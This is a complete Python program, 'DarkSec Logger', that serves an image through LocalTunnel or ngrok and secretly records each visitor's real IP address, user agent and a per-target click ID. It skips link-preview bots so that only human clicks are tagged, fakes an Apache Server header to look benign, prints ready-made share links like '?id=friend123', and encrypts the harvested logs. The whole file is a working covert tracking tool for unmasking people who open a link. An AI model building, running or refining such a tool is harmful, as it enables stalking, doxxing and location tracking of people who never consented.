#!/usr/bin/env python3
# DarkSec Logger – LocalTunnel + Doctor (Audited Build)
# Features: Proxy-IP, Bot Filter, AES-256, GUI/Silent, 2-row toolbar, LT+ngrok

import os, sys, time, json, base64, hashlib, threading, re, urllib.parse, subprocess, shutil, secrets, string, platform
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler

import tkinter as tk
from tkinter import filedialog, scrolledtext, simpledialog, messagebox

# ---------------------------
# Optional crypto (PyCryptodome)
# ---------------------------
try:
    from Crypto.Cipher import AES
    HAS_CRYPTO = True
except Exception:
    HAS_CRYPTO = False

# ---------------------------
# Optional pyngrok
# ---------------------------
ngrok = None
try:
    from pyngrok import ngrok as _ngrok
    from pyngrok import conf as ngconf
    ngrok = _ngrok
    HAS_PYNGROK = True
except Exception:
    HAS_PYNGROK = False

APP_TITLE = "DarkSec Logger – LocalTunnel + Doctor"
DEFAULT_PORT = 8000

# Globals
selected_image = None
server = None
server_thread = None
silent_mode = False
log_buffer = []
log_widget = None
listen_port = DEFAULT_PORT

# LocalTunnel process & URL
lt_proc = None
lt_url = None

# ngrok tunnel handle
ngrok_tunnel = None

# ---------------------------
# Config (ngrok token)
# ---------------------------
CONFIG_DIR = Path.home() / ".config" / "darksec_logger"
CONFIG_FILE = CONFIG_DIR / "config.json"

def _ensure_config_dir():
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    try: CONFIG_DIR.chmod(0o700)
    except Exception: pass

def load_config():
    _ensure_config_dir()
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE, "r") as f:
                d = json.load(f)
                return d if isinstance(d, dict) else {}
        except Exception:
            return {}
    return {}

def save_config(d: dict):
    _ensure_config_dir()
    with open(CONFIG_FILE, "w") as f:
        json.dump(d, f, indent=2)
    try: CONFIG_FILE.chmod(0o600)
    except Exception: pass

def get_ngrok_token():
    t = os.environ.get("NGROK_AUTHTOKEN")
    if t: return t.strip()
    d = load_config()
    t = d.get("ngrok_auth_token")
    return t.strip() if t else None

def set_ngrok_token_gui():
    t = simpledialog.askstring("NGROK Auth Token", "Enter your ngrok authtoken:", show="*")
    if not t: return
    cfg = load_config(); cfg["ngrok_auth_token"] = t.strip(); save_config(cfg)
    messagebox.showinfo("Saved", f"Token saved to {CONFIG_FILE} (0600)")

# ---------------------------
# AES-256 (EAX)
# ---------------------------
def _kdf(pw: str) -> bytes:
    return hashlib.sha256(pw.encode()).digest()

def encrypt_logs(s: str, pw: str) -> str:
    if not HAS_CRYPTO: raise RuntimeError("PyCryptodome missing")
    key = _kdf(pw)
    c = AES.new(key, AES.MODE_EAX)
    ct, tag = c.encrypt_and_digest(s.encode())
    return base64.b64encode(c.nonce + tag + ct).decode()

def decrypt_logs_blob(b64: str, pw: str):
    if not HAS_CRYPTO: return None
    try:
        raw = base64.b64decode(b64.encode())
        nonce, tag, ct = raw[:16], raw[16:32], raw[32:]
        key = _kdf(pw)
        c = AES.new(key, AES.MODE_EAX, nonce=nonce)
        return c.decrypt_and_verify(ct, tag).decode()
    except Exception:
        return None

# ---------------------------
# Helpers
# ---------------------------
def content_type_for(path: str) -> str:
    p = path.lower()
    if p.endswith(".png"): return "image/png"
    if p.endswith(".gif"): return "image/gif"
    if p.endswith(".jpg") or p.endswith(".jpeg"): return "image/jpeg"
    if p.endswith(".webp"): return "image/webp"
    return "application/octet-stream"

BOT_UA = re.compile(
    r"(facebookexternalhit|Twitterbot|Slackbot|TelegramBot|Discordbot|WhatsApp|"
    r"LinkedInBot|SkypeUriPreview|Applebot|Pinterest|Google-InspectionTool|"
    r"VKShare|Qwantify|Snapchat|redditbot|bot|crawler|spider)",
    re.I
)

# ---------------------------
# HTTP Handler
# ---------------------------
class TrackerHandler(BaseHTTPRequestHandler):
    def log_message(self, *args, **kwargs): return  # silence default logging

    def do_GET(self):
        global log_buffer, log_widget, selected_image

        parsed = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(parsed.query)
        click_id = qs.get("id", [""])[0]

        # Prefer proxy headers for real origin (ngrok / localtunnel / reverse proxy)
        xff = self.headers.get("X-Forwarded-For")
        xri = self.headers.get("X-Real-IP")
        origin_ip = (xff.split(",")[0].strip() if xff else None) or (xri.strip() if xri else None)
        client_ip = origin_ip or self.client_address[0]

        ua = self.headers.get("User-Agent", "Unknown")
        is_bot = bool(BOT_UA.search(ua))
        tag = "BOT" if is_bot else "HUMAN"
        ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        log_line = f"[{ts}] [{tag}] IP: {client_ip} | UA: {ua} | PATH: {self.path} | ID: {click_id}\n"
        log_buffer.append(log_line)
        if log_widget:
            log_widget.insert(tk.END, log_line); log_widget.see(tk.END)

        try:
            if selected_image and os.path.exists(selected_image):
                with open(selected_image, "rb") as f:
                    img = f.read()
                self.send_response(200)
                self.send_header("Content-Type", content_type_for(selected_image))
                self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
                self.send_header("Cache-Control", "max-age=86400, private")
                self.send_header("Content-Length", str(len(img)))
                self.send_header("Vary", "User-Agent, X-Forwarded-For")
                self.end_headers()
                self.wfile.write(img)
            else:
                self.send_response(404)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
                self.end_headers()
                self.wfile.write(b"<h1>404 Not Found</h1>")
        except Exception:
            self.send_response(500); self.end_headers(); self.wfile.write(b"Internal Server Error")

# ---------------------------
# Server Control
# ---------------------------
def start_server(port: int):
    global server
    server = HTTPServer(("0.0.0.0", port), TrackerHandler)
    server.serve_forever()

def start_logging():
    global server_thread
    if not selected_image:
        if not silent_mode: messagebox.showerror("Error", "Select an image before starting the server.")
        else: print("[-] No image selected. In silent mode, pass --image /path/to.jpg or place 'silent.jpg' next to script.")
        return
    server_thread = threading.Thread(target=start_server, args=(listen_port,), daemon=True)
    server_thread.start()
    if silent_mode:
        print(f"[*] DarkSec Logger started on port {listen_port}")
    elif log_widget:
        log_widget.insert(tk.END, f"[*] DarkSec Logger started on port {listen_port}\n")

def stop_logging():
    global server, ngrok_tunnel, lt_proc
    if server:
        server.shutdown(); server = None
        if silent_mode:
            print("[*] DarkSec Logger stopped.")
        elif log_widget:
            log_widget.insert(tk.END, "[*] DarkSec Logger stopped.\n")
    if ngrok_tunnel and ngrok:
        try: ngrok.disconnect(ngrok_tunnel.public_url); ngrok.kill()
        except Exception: pass
        ngrok_tunnel = None
        if not silent_mode and log_widget: log_widget.insert(tk.END, "[*] NGROK tunnel stopped.\n")
        else: print("[*] NGROK tunnel stopped.")
    if lt_proc and lt_proc.poll() is None:
        try: lt_proc.terminate()
        except Exception: pass
        if not silent_mode and log_widget: log_widget.insert(tk.END, "[*] LocalTunnel stopped.\n")
        else: print("[*] LocalTunnel stopped.")

# ---------------------------
# Logs (Encrypt/Decrypt)
# ---------------------------
def save_logs_encrypted():
    if not log_buffer:
        messagebox.showwarning("No Logs", "No logs to save yet."); return
    if not HAS_CRYPTO:
        messagebox.showerror("Missing", "PyCryptodome not installed."); return
    pw = simpledialog.askstring("Encryption", "Enter password to encrypt logs:", show="*")
    if not pw: return
    enc = encrypt_logs("".join(log_buffer), pw)
    fp = filedialog.asksaveasfilename(defaultextension=".log.enc", filetypes=[("Encrypted Log","*.log.enc")])
    if fp:
        with open(fp, "w") as f: f.write(enc)
        messagebox.showinfo("Saved", f"Logs saved at:\n{fp}")

def decrypt_logs_gui():
    if not HAS_CRYPTO:
        messagebox.showerror("Missing", "PyCryptodome not installed."); return
    fp = filedialog.askopenfilename(filetypes=[("Encrypted Log","*.log.enc")])
    if not fp: return
    enc = open(fp, "r").read()
    pw = simpledialog.askstring("Decryption", "Enter password:", show="*")
    if not pw: return
    plain = decrypt_logs_blob(enc, pw)
    if plain is None:
        messagebox.showerror("Error", "Wrong password or corrupted file."); return
    top = tk.Toplevel(); top.title("Decrypted Logs")
    txt = scrolledtext.ScrolledText(top, width=100, height=30)
    txt.insert(tk.END, plain); txt.configure(state="disabled"); txt.pack(fill="both", expand=True, padx=8, pady=8)
    def save_as():
        out = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text File","*.txt")])
        if out: open(out,"w").write(plain); messagebox.showinfo("Saved", f"Saved to:\n{out}")
    tk.Button(top, text="Save As...", command=save_as).pack(pady=6)

# ---------------------------
# Image select (GUI)
# ---------------------------
def select_image():
    global selected_image
    fp = filedialog.askopenfilename(
        title="Select image to serve",
        filetypes=[("Images", "*.jpg *.jpeg *.png *.gif *.webp"), ("All files", "*.*")]
    )
    if fp:
        selected_image = fp
        if not silent_mode and log_widget:
            log_widget.insert(tk.END, f"[*] Selected image: {selected_image}\n")

# ---------------------------
# LocalTunnel
# ---------------------------
def rand_subdomain(prefix="dsec", n=6):
    alphabet = string.ascii_lowercase + string.digits
    return prefix + ''.join(secrets.choice(alphabet) for _ in range(n))

def _parse_lt_url_from_line(line: str) -> str | None:
    # LT prints either "your url is: https://..." or just "https://..."
    m = re.search(r"https://[^\s]+", line)
    return m.group(0) if m else None

def start_localtunnel_gui():
    """GUI start: asks for optional subdomain, starts lt, captures URL."""
    return _start_localtunnel(subdomain=simpledialog.askstring("LocalTunnel", "Custom subdomain (optional):"))

def start_localtunnel_cli(subdomain: str | None):
    """CLI start: non-interactive."""
    return _start_localtunnel(subdomain=subdomain)

def _start_localtunnel(subdomain: str | None):
    global lt_proc, lt_url
    if lt_proc and lt_proc.poll() is None:
        _log_gui_or_print(f"[i] LocalTunnel already running: {lt_url}", info_box=True, title="LocalTunnel")
        return
    lt_bin = shutil.which("lt")
    if not lt_bin:
        fix = "npm install -g localtunnel"
        _log_gui_or_print(f"[!] LocalTunnel CLI not found. Install:\n  {fix}", error_box=True, title="LocalTunnel")
        return
    sub = subdomain.strip() if subdomain else rand_subdomain()
    args = [lt_bin, "--port", str(listen_port), "--subdomain", sub]
    lt_proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    _log_gui_or_print("[*] Starting LocalTunnel...\n")
    def reader():
        global lt_url
        for line in lt_proc.stdout:
            _log_gui_or_print(line)
            url = _parse_lt_url_from_line(line)
            if url:
                lt_url = url
                tip = ""
                if selected_image:
                    img = Path(selected_image).name
                    tip = f"\n[+] Share: {lt_url}/{img}?id=friend123"
                _log_gui_or_print(f"[*] LocalTunnel URL: {lt_url}{tip}\n", info_box=True, title="LocalTunnel")
                break
    threading.Thread(target=reader, daemon=True).start()

def stop_localtunnel():
    global lt_proc
    if lt_proc and lt_proc.poll() is None:
        try: lt_proc.terminate()
        except Exception: pass
        _log_gui_or_print("[*] LocalTunnel stopped.\n", info_box=False)
    else:
        _log_gui_or_print("LocalTunnel not running.", info_box=True, title="LocalTunnel")

# ---------------------------
# ngrok (optional)
# ---------------------------
def start_ngrok():
    global ngrok_tunnel
    if not HAS_PYNGROK:
        _log_gui_or_print("[!] pyngrok not installed. Install:\n  python3 -m pip install pyngrok", error_box=True, title="NGROK")
        return
    if ngrok_tunnel:
        _log_gui_or_print(f"NGROK already running: {ngrok_tunnel.public_url}", info_box=True, title="NGROK"); return
    try:
        tok = get_ngrok_token()
        if tok: ngconf.get_default().auth_token = tok
    except Exception: pass
    ngrok_tunnel = ngrok.connect(listen_port, "http")
    public_url = ngrok_tunnel.public_url
    tip = ""
    if selected_image:
        img = Path(selected_image).name
        tip = f"\n[+] Share: {public_url}/{img}?id=friend123"
    _log_gui_or_print(f"[*] NGROK tunnel: {public_url}{tip}\n", info_box=True, title="NGROK")

# ---------------------------
# Dependency Doctor
# ---------------------------
def run_doctor():
    msgs = []
    def ok(s): return f"[OK] {s}\n"
    def warn(s): return f"[WARN] {s}\n"
    def fail(s): return f"[FAIL] {s}\n"

    msgs.append(ok(f"Python {sys.version.split()[0]}"))
    msgs.append(ok("Tkinter GUI available"))

    if HAS_CRYPTO: msgs.append(ok("PyCryptodome installed"))
    else:
        msgs.append(fail("PyCryptodome missing → fix:\n  python3 -m pip install pycryptodome"))

    if HAS_PYNGROK: msgs.append(ok("pyngrok installed"))
    else:
        msgs.append(warn("pyngrok not installed (optional) →\n  python3 -m pip install pyngrok"))

    node = shutil.which("node"); npm = shutil.which("npm"); lt = shutil.which("lt")
    is_mac = sys.platform == "darwin"
    is_deb = Path("/etc/debian_version").exists()

    if node: msgs.append(ok(f"node found: {node}"))
    else:
        msgs.append(warn("node missing → " + ("brew install node" if is_mac else "sudo apt install nodejs")))

    if npm: msgs.append(ok(f"npm found: {npm}"))
    else:
        msgs.append(warn("npm missing → " + ("brew install npm" if is_mac else "sudo apt install npm")))

    if lt: msgs.append(ok(f"localtunnel found: {lt}"))
    else:
        msgs.append(warn("LocalTunnel missing → npm install -g localtunnel"))

    tok = get_ngrok_token()
    if tok: msgs.append(ok("ngrok token present (env or config)"))
    else: msgs.append(warn("ngrok token not set (only needed if you use ngrok).\n  GUI: Set NGROK Token\n  CLI: --set-ngrok-token YOUR_TOKEN"))

    out = "".join(msgs)
    _log_gui_or_print("\n=== Dependency Doctor ===\n" + out + "\n", info_box=True, title="Dependency Doctor")

# ---------------------------
# GUI (two-row toolbar)
# ---------------------------
def run_gui():
    global log_widget, listen_port
    root = tk.Tk()
    root.title(APP_TITLE)
    root.geometry("1000x600")
    root.minsize(900, 520)
    root.configure(bg="black")

    title = tk.Label(root, text="DarkSec Logger", fg="lime", bg="black", font=("Consolas", 20, "bold"))
    title.pack(pady=6)

    # Row 1 (core actions)
    row1 = tk.Frame(root, bg="black"); row1.pack(pady=(2,0), padx=8, fill="x")
    tk.Label(row1, text="Port:", bg="black", fg="white").pack(side="left", padx=(0,6))
    port_entry = tk.Entry(row1, width=7); port_entry.insert(0, str(DEFAULT_PORT)); port_entry.pack(side="left", padx=(0,10))
    def apply_port():
        nonlocal port_entry
        global listen_port
        try:
            p = int(port_entry.get())
            if not (1 <= p <= 65535): raise ValueError
            listen_port = p
            messagebox.showinfo("Port", f"Listening on {listen_port}")
        except Exception:
            messagebox.showerror("Port Error", "Enter a valid port (1-65535).")
    tk.Button(row1, text="Set Port", command=apply_port, bg="gray20", fg="white").pack(side="left", padx=4)
    tk.Button(row1, text="Select Image", command=select_image, bg="gray20", fg="white").pack(side="left", padx=4)
    tk.Button(row1, text="Start Server", command=start_logging, bg="green", fg="black").pack(side="left", padx=4)
    tk.Button(row1, text="Stop Server", command=stop_logging, bg="red", fg="white").pack(side="left", padx=4)

    # Row 2 (tunnels, crypto, doctor)
    row2 = tk.Frame(root, bg="black"); row2.pack(pady=(6,4), padx=8, fill="x")
    tk.Button(row2, text="Start LocalTunnel", command=start_localtunnel_gui, bg="magenta", fg="black").pack(side="left", padx=4)
    tk.Button(row2, text="Stop LocalTunnel", command=stop_localtunnel, bg="magenta", fg="white").pack(side="left", padx=4)
    tk.Button(row2, text="Start NGROK", command=start_ngrok, bg="orange", fg="black").pack(side="left", padx=4)
    tk.Button(row2, text="Set NGROK Token", command=set_ngrok_token_gui, bg="gray20", fg="white").pack(side="left", padx=4)
    tk.Button(row2, text="Save Encrypted Logs", command=save_logs_encrypted, bg="blue", fg="white").pack(side="left", padx=4)
    tk.Button(row2, text="Decrypt Logs", command=decrypt_logs_gui, bg="purple", fg="white").pack(side="left", padx=4)
    tk.Button(row2, text="Run Dependency Doctor", command=run_doctor, bg="cyan", fg="black").pack(side="left", padx=4)

    # Log console
    log_widget = scrolledtext.ScrolledText(root, bg="black", fg="lime", insertbackground="lime")
    log_widget.pack(fill="both", expand=True, padx=10, pady=10)

    def on_close():
        stop_logging()
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", on_close)
    root.after(500, run_doctor)  # auto-doctor
    root.mainloop()

# ---------------------------
# CLI helpers & entry
# ---------------------------
def _log_gui_or_print(msg: str, info_box=False, error_box=False, title="Info"):
    msg = msg if msg.endswith("\n") else msg + "\n"
    if log_widget:
        log_widget.insert(tk.END, msg); log_widget.see(tk.END)
        if info_box: messagebox.showinfo(title, msg)
        if error_box: messagebox.showerror(title, msg)
    else:
        if info_box or error_box: print(msg.strip())
        else: print(msg, end="")

def usage():
    print(f"""
{APP_TITLE}

Usage:
  python3 DarkSecLogger.py                      # GUI
  python3 DarkSecLogger.py --silent             # headless (port {DEFAULT_PORT})
  python3 DarkSecLogger.py --silent --port 8080 # headless custom port
  python3 DarkSecLogger.py --silent --image /path/to.jpg
  python3 DarkSecLogger.py --silent --localtunnel [--subdomain NAME]
  python3 DarkSecLogger.py --silent --ngrok
  python3 DarkSecLogger.py --set-ngrok-token YOUR_TOKEN
  python3 DarkSecLogger.py --show-config
""".strip())

def main_cli():
    global silent_mode, listen_port, selected_image, ngrok_tunnel
    args = sys.argv[1:]
    if not args:
        run_gui(); return

    if args[0] in ("-h", "--help"):
        usage(); return

    if args[0] == "--set-ngrok-token":
        if len(args) < 2:
            print("Usage: --set-ngrok-token YOUR_TOKEN"); return
        cfg = load_config(); cfg["ngrok_auth_token"] = args[1].strip(); save_config(cfg)
        print("[*] ngrok token saved."); return

    if args[0] == "--show-config":
        print(json.dumps(load_config(), indent=2)); return

    if args[0] == "--silent":
        silent_mode = True
        # Parse optional flags
        i = 1
        subdomain = None
        start_lt = False
        start_ng = False
        while i < len(args):
            if args[i] == "--port":
                listen_port = int(args[i+1]); i += 2
            elif args[i] == "--image":
                selected_image = args[i+1]; i += 2
            elif args[i] in ("--localtunnel", "--lt"):
                start_lt = True; i += 1
            elif args[i] == "--subdomain":
                subdomain = args[i+1]; i += 2
            elif args[i] == "--ngrok":
                start_ng = True; i += 1
            else:
                print(f"[!] Unknown flag: {args[i]}"); i += 1

        if not selected_image and os.path.exists("silent.jpg"):
            selected_image = "silent.jpg"

        if not selected_image:
            print("[!] No image selected. Use --image /path/to.jpg or place silent.jpg next to script.")

        # Start server
        start_logging()

        # Start LT if requested
        if start_lt:
            start_localtunnel_cli(subdomain=subdomain)

        # Start ngrok if requested
        if start_ng:
            if not HAS_PYNGROK:
                print("[!] pyngrok not installed: python3 -m pip install pyngrok")
            else:
                try:
                    tok = get_ngrok_token()
                    if tok: ngconf.get_default().auth_token = tok
                    ngrok_tunnel = ngrok.connect(listen_port, "http")
                    print(f"[*] NGROK: {ngrok_tunnel.public_url}")
                    if selected_image:
                        print(f"[+] Share: {ngrok_tunnel.public_url}/{Path(selected_image).name}?id=test001")
                except Exception as e:
                    print(f"[!] NGROK failed: {e}")

        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            stop_logging(); print("[*] Stopped.")
        return

    # Fallback: unknown args -> GUI
    run_gui()

# ---------------------------
# Entry
# ---------------------------
if __name__ == "__main__":
    main_cli()